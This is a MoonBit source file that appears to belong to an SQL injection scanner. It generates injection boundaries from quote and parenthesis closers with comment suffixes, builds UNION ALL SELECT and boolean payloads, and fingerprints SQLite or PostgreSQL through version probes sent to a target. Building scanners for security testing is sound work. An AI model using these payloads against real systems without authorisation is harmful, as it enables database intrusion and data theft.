///|
pub(all) struct Boundary {
  prefix : String
  suffix : String
}

///|
/// Prefix contains the original value and the SQL context closing characters.
pub fn boundaries(
  ctx : @core.ScanContext,
  parameter : @core.Parameter,
) -> Array[Boundary] {
  if ctx.options.prefix is Some(prefix) {
    return [
      {
        prefix: parameter.value + prefix,
        suffix: ctx.options.suffix.unwrap_or("-- "),
      },
    ]
  }
  ["", "'", ")", "')", "))", "'))", "\"", "\")"].map(close => {
    prefix: parameter.value + close,
    suffix: ctx.options.suffix.unwrap_or("-- "),
  })
}

///|
pub fn point(
  parameter : @core.Parameter,
  database : @core.Dbms,
  technique : @core.Technique,
  prefix : String,
  suffix : String,
  columns~ : Int32 = 0,
  position~ : Int32 = 0,
) -> @core.InjectionPoint {
  {
    location: parameter.location,
    index: parameter.index,
    parameter: parameter.name,
    database,
    technique,
    prefix,
    suffix,
    union_columns: columns,
    union_position: position,
  }
}

///|
pub fn dialects(
  ctx : @core.ScanContext,
  parameter : @core.Parameter,
) -> Array[@core.Dbms] {
  if ctx.options.dbms != Unknown {
    return [ctx.options.dbms]
  }
  let known = ctx.findings
    .filter(f => {
      f.location == parameter.location &&
      f.index == parameter.index &&
      f.verdict == Confirmed &&
      f.database != Unknown
    })
    .map(f => f.database)
  if !known.is_empty() {
    known
  } else {
    [SQLite, PostgreSQL]
  }
}

///|
pub fn literal(value : String) -> String {
  "'" + value.replace(old="'", new="''") + "'"
}

///|
pub fn computed(value : String) -> String {
  let mid = value.length() / 2
  "(" +
  literal(value[:mid].to_owned()) +
  "||" +
  literal(value[mid:].to_owned()) +
  ")"
}

///|
pub fn union_value(p : @core.InjectionPoint, expression : String) -> String {
  let values = Array::make(p.union_columns, "NULL")
  values[p.union_position] = expression
  p.prefix + " AND 1=0 UNION ALL SELECT " + values.join(",") + " " + p.suffix
}

///|
pub fn boolean_value(p : @core.InjectionPoint, condition : String) -> String {
  p.prefix + "(" + condition + ")" + p.suffix
}

///|
pub async fn fingerprint_point(
  ctx : @core.ScanContext,
  parameter : @core.Parameter,
  baseline : @core.Response,
  p : @core.InjectionPoint,
) -> @core.InjectionPoint {
  for db in dialects(ctx, parameter) {
    if db != SQLite && db != PostgreSQL {
      continue
    }
    let expr = if db == SQLite {
      "sqlite_version() IS NOT NULL"
    } else {
      "current_setting('server_version') IS NOT NULL"
    }
    guard send(ctx, "fingerprint", parameter~, value=boolean_value(p, expr))
      is Some((yes, _)) else {
      return p
    }
    if !(ctx.compare)(baseline, yes) {
      continue
    }
    guard send(
        ctx,
        "fingerprint-control",
        parameter~,
        value=boolean_value(p, "NOT (" + expr + ")"),
      )
      is Some((no, _)) else {
      return p
    }
    if (
        (no.status < 200 || no.status >= 300) &&
        ctx.options.comparison.code is None
      ) ||
      (ctx.compare)(baseline, no) {
      continue
    }
    guard send(
        ctx,
        "fingerprint-confirmation",
        parameter~,
        value=boolean_value(p, expr),
      )
      is Some((again, _)) else {
      return p
    }
    if (ctx.compare)(baseline, again) && restore(ctx, baseline, parameter) {
      return { ..p, database: db, }
    }
    if ctx.has_errors() {
      return p
    }
  }
  p
}
